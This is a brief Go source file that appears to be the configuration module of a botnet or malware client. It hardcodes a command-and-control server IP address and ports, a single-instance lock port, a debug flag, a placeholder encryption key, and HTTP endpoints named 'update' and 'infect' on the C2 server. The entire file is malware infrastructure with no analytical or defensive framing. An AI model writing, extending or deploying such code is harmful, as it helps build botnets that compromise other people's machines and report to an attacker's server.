package utils

import (
	"fmt"
	"os"
)

var (
	CncAddr    = "85.31.44.75"
	CncPort    = 444
	CncApiPort = 3333

	SingleInstancePort = 13378
	BinVersion         = "0.0.2"
	DebugEnabled       = true

	PID     = os.Getpid()
	Edpoint = map[string]string{
		"update": fmt.Sprintf("http://%s:%d/update", CncAddr, CncApiPort),
		"infect": fmt.Sprintf("http://%s:%d/infect", CncAddr, CncApiPort),
	}

	EncryptionKey = "aaaaaaaaaa"
)

var (
	InstanceRunning = true
)
